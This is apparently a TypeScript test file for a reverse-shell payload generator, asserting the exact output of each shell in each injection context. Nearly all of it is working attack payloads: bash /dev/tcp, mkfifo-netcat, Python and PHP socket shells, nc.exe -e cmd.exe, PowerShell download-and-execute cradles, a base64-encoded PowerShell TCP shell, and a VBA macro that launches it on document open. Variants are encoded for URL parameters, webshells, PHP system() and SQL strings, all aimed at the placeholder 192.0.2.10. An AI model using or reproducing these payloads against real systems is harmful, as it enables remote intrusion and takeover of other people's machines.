import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { decodeUtf16leBase64 } from "../../../engines/payloads/encode";
import type { PasteContext } from "../../../engines/payloads/context";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";

const V = { LHOST: "192.0.2.10", LPORT: "443" };
const def = (id: string) => {
  const d = REVERSE_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};

describe("REVERSE_SHELLS", () => {
  it("every def has parts covering each flag in its template", () => {
    for (const d of REVERSE_SHELLS) {
      expect(d.parts.length).toBeGreaterThan(0);
      for (const p of d.parts) expect(p.token && p.explain).toBeTruthy();
      for (const ctx of d.contexts) {
        const { text } = buildPayload(d, ctx, V);
        const flags = text.match(/(?<=^|[\s+])--?[A-Za-z][\w]*/g) ?? [];
        for (const f of flags) {
          expect(d.parts.some((p) => p.token.includes(f)), `${d.id}/${ctx}: ${f}`).toBe(true);
        }
      }
    }
  });

  it("bash-tcp in injected-linux is bash -c wrapped", () => {
    expect(buildPayload(def("bash-tcp"), "injected-linux", V).text).toBe("bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'");
  });

  it("no Linux def uses nc -e", () => {
    for (const d of REVERSE_SHELLS.filter((x) => x.os === "linux")) expect(d.template).not.toMatch(/\bnc\b.* -e\b/);
  });

  it("ps-b64 decodes to a TCPClient script with the given LHOST and LPORT", () => {
    const { text } = buildPayload(def("ps-b64"), "cmd", V);
    const m = text.match(/^powershell -nop -w hidden -e (\S+)$/);
    expect(m).not.toBeNull();
    const script = decodeUtf16leBase64(m![1]);
    expect(script).toContain("TCPClient");
    expect(script).toContain('("192.0.2.10",443)');
  });

  it("ps-b64 in url-param is URL-encoded so base64 survives", () => {
    const { text } = buildPayload(def("ps-b64"), "url-param", V);
    expect(text).toMatch(/^powershell\+-nop\+-w\+hidden\+-e\+/);
    expect(text).not.toMatch(/[=/]/);
    const b64 = decodeURIComponent(text.replace(/\+-e\+/, "+-e+").split("-e+")[1].replace(/\+/g, "%2B"));
    expect(decodeUtf16leBase64(b64)).toContain('TCPClient("192.0.2.10",443)');
  });

  it("nishang-cradle in sql-string has doubled quotes", () => {
    const b = buildPayload(def("nishang-cradle"), "sql-string", V);
    expect(b.text).toContain("DownloadString(''http://192.0.2.10/rev.ps1'')");
    expect(def("nishang-cradle").bakesIp).toBe(true);
    expect(def("powercat-cradle").bakesIp).toBeFalsy();
  });

  it("nc-exe carries the no -e note", () => {
    expect(buildPayload(def("nc-exe"), "cmd", V).notes.join(" ")).toContain("if it returns instantly, the build has no -e");
  });

  it("listener is penelope -O -p 443 for LPORT 443", () => {
    expect(buildPayload(def("bash-tcp"), "bash-prompt", V).listener).toBe("penelope -O -p 443");
  });

  it("unresolved lists LHOST when it is blank", () => {
    const b = buildPayload(def("bash-tcp"), "bash-prompt", { LHOST: " ", LPORT: "443" });
    expect(b.unresolved).toEqual(["LHOST"]);
    expect(b.text).toContain("{LHOST}");
    const e = buildPayload(def("ps-b64"), "cmd", { LPORT: "443" });
    expect(e.unresolved).toEqual(["LHOST"]);
    expect(e.text).toContain("{LHOST}");
  });

  it("backgrounded mkfifo ends with ) &", () => {
    expect(buildPayload(def("mkfifo-nc-bg"), "bash-prompt", V).text).toMatch(/^\(rm -f.*\) &$/);
  });

  it("bash-tcp in php-system is bash -c wrapped inside system()", () => {
    expect(buildPayload(def("bash-tcp"), "php-system", V).text).toBe(
      "system('bash -c \\'bash -i >& /dev/tcp/192.0.2.10/443 0>&1\\'');",
    );
  });

  it("ps-b64 in macro: every line fits VBA and the chunks rebuild the command", () => {
    const { text } = buildPayload(def("ps-b64"), "macro", V);
    const lines = text.split("\n");
    for (const l of lines) expect(l.length).toBeLessThanOrEqual(1023);
    const joined = lines
      .map((l) => l.match(/^ {4}Str = Str \+ "(.*)"$/)?.[1])
      .filter((x): x is string => x !== undefined)
      .join("")
      .replace(/""/g, '"');
    expect(joined).toBe(buildPayload(def("ps-b64"), "cmd", V).text);
    expect(text).toContain('CreateObject("Wscript.Shell").Run Str');
    expect(text).toContain("Sub AutoOpen()");
    expect(text).toContain("Sub Document_Open()");
  });

  const CRADLE = `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')"`;
  const FIFO = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f";
  const exact: [string, Parameters<typeof buildPayload>[1], string][] = [
    ["bash-tcp", "bash-prompt", "bash -i >& /dev/tcp/192.0.2.10/443 0>&1"],
    ["bash-tcp", "url-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["bash-tcp", "webshell-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["mkfifo-nc", "bash-prompt", FIFO],
    ["mkfifo-nc", "injected-linux", `bash -c '${FIFO}'`],
    ["mkfifo-nc-bg", "bash-prompt", `(${FIFO}) &`],
    ["nishang-cradle", "cmd", CRADLE],
    ["nishang-cradle", "powershell", CRADLE],
    ["nishang-cradle", "sql-string", CRADLE.replace(/'/g, "''")],
    ["powercat-cradle", "powershell", "IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell"],
    ["nc-exe", "cmd", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
    ["nc-exe", "powershell", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
  ];
  it.each(exact)("%s in %s gives the exact text", (id, ctx, want) => {
    expect(buildPayload(def(id), ctx, V).text).toBe(want);
  });

  it("ps-b64 in cmd and powershell is the same single command line", () => {
    expect(buildPayload(def("ps-b64"), "powershell", V).text).toBe(buildPayload(def("ps-b64"), "cmd", V).text);
  });
});

// Every def in every context it declares, as pasted (spec §4.3). Synthetic values only. The expected strings come from
// an independent model of the wrapping rules (bash -c, the URL set, PHP escaping, doubled SQL quotes, VBA chunks).
// This base64 has no + / or =, so it reads the same inside a URL.
const PS_B64 = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA";

describe("every reverse shell × every context it declares: exact text", () => {
  const rows: [string, string, string][] = [
    ["bash-tcp", "bash-prompt", "bash -i >& /dev/tcp/192.0.2.10/443 0>&1"],
    ["bash-tcp", "injected-linux", "bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'"],
    ["bash-tcp", "url-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["bash-tcp", "webshell-param", "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27"],
    ["bash-tcp", "php-system", "system('bash -c \\'bash -i >& /dev/tcp/192.0.2.10/443 0>&1\\'');"],
    ["mkfifo-nc", "bash-prompt", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f"],
    ["mkfifo-nc", "injected-linux", "bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f'"],
    ["mkfifo-nc", "url-param", "bash+-c+%27rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff%27"],
    ["mkfifo-nc", "webshell-param", "bash+-c+%27rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff%27"],
    ["mkfifo-nc", "php-system", "system('bash -c \\'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f\\'');"],
    ["mkfifo-nc-bg", "bash-prompt", "(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &"],
    ["mkfifo-nc-bg", "injected-linux", "bash -c '(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &'"],
    ["mkfifo-nc-bg", "url-param", "bash+-c+%27(rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff)+%26%27"],
    ["mkfifo-nc-bg", "webshell-param", "bash+-c+%27(rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff)+%26%27"],
    ["mkfifo-nc-bg", "php-system", "system('bash -c \\'(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &\\'');"],
    ["python3", "bash-prompt", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"],
    ["python3", "injected-linux", "bash -c 'python3 -c '\\''import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'\\'''"],
    ["python3", "url-param", "bash+-c+%27python3+-c+%27%5C%27%27import+socket,os,pty%3Bs%3Dsocket.socket()%3Bs.connect((%22192.0.2.10%22,443))%3B%5Bos.dup2(s.fileno(),f)+for+f+in+(0,1,2)%5D%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27%5C%27%27%27"],
    ["python3", "webshell-param", "bash+-c+%27python3+-c+%27%5C%27%27import+socket,os,pty%3Bs%3Dsocket.socket()%3Bs.connect((%22192.0.2.10%22,443))%3B%5Bos.dup2(s.fileno(),f)+for+f+in+(0,1,2)%5D%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27%5C%27%27%27"],
    ["python3", "php-system", "system('bash -c \\'python3 -c \\'\\\\\\'\\'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")\\'\\\\\\'\\'\\'');"],
    ["php-exec", "bash-prompt", "php -r '$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
    ["php-exec", "injected-linux", "bash -c 'php -r '\\''$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\\'''"],
    ["php-exec", "url-param", "bash+-c+%27php+-r+%27%5C%27%27$sock%3Dfsockopen(%22192.0.2.10%22,443)%3Bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3B%27%5C%27%27%27"],
    ["php-exec", "webshell-param", "bash+-c+%27php+-r+%27%5C%27%27$sock%3Dfsockopen(%22192.0.2.10%22,443)%3Bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3B%27%5C%27%27%27"],
    ["php-exec", "php-system", "system('bash -c \\'php -r \\'\\\\\\'\\'$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");\\'\\\\\\'\\'\\'');"],
    ["ps-b64", "cmd", "powershell -nop -w hidden -e " + PS_B64 + ""],
    ["ps-b64", "powershell", "powershell -nop -w hidden -e " + PS_B64 + ""],
    ["ps-b64", "webshell-param", "powershell+-nop+-w+hidden+-e+" + PS_B64 + ""],
    ["ps-b64", "url-param", "powershell+-nop+-w+hidden+-e+" + PS_B64 + ""],
    ["ps-b64", "macro", "Sub MyMacro()\n    Dim Str As String\n    Str = Str + \"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA\"\n    Str = Str + \"D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0\"\n    Str = Str + \"ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa\"\n    Str = Str + \"QBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA\"\n    Str = Str + \"0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlA\"\n    Str = Str + \"G4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQ\"\n    Str = Str + \"AZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUAN\"\n    Str = Str + \"QAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA\"\n    Str = Str + \"9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0A\"\n    Str = Str + \"GUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQ\"\n    Str = Str + \"AaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAP\"\n    Str = Str + \"QAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQB\"\n    Str = Str + \"OAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTA\"\n    Str = Str + \"EMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHI\"\n    Str = Str + \"AaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJ\"\n    Str = Str + \"ABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZAB\"\n    Str = Str + \"hAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpA\"\n    Str = Str + \"G4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQ\"\n    Str = Str + \"AcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAI\"\n    Str = Str + \"AAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwA\"\n    Str = Str + \"kAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuA\"\n    Str = Str + \"GUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEc\"\n    Str = Str + \"AZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAK\"\n    Str = Str + \"QA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQB\"\n    Str = Str + \"uAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuA\"\n    Str = Str + \"EwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHU\"\n    Str = Str + \"AcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZ\"\n    Str = Str + \"QAoACkA\"\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub"],
    ["powercat-cradle", "powershell", "IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell"],
    ["nishang-cradle", "cmd", "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\""],
    ["nishang-cradle", "powershell", "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\""],
    ["nishang-cradle", "sql-string", "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(''http://192.0.2.10/rev.ps1'')\""],
    ["nc-exe", "cmd", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
    ["nc-exe", "powershell", "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443"],
    ["nc-exe", "webshell-param", "C:%5CWindows%5CTemp%5Cnc.exe+-e+cmd.exe+192.0.2.10+443"],
    ["nc-exe", "url-param", "C:%5CWindows%5CTemp%5Cnc.exe+-e+cmd.exe+192.0.2.10+443"],
  ];
  it("covers every def and context", () => {
    expect(rows.map(([id, ctx]) => `${id}/${ctx}`).sort()).toEqual(REVERSE_SHELLS.flatMap((d) => d.contexts.map((c) => `${d.id}/${c}`)).sort());
  });
  // python3 and php-exec through url-param carry single quotes ('\'' inside bash -c) and so a backslash; nc-exe a path.
  it.each(rows)("%s in %s", (id, ctx, expected) => {
    const b = buildPayload(def(id), ctx as PasteContext, V);
    expect(b.unresolved).toEqual([]);
    expect(b.text).toBe(expected);
  });
});
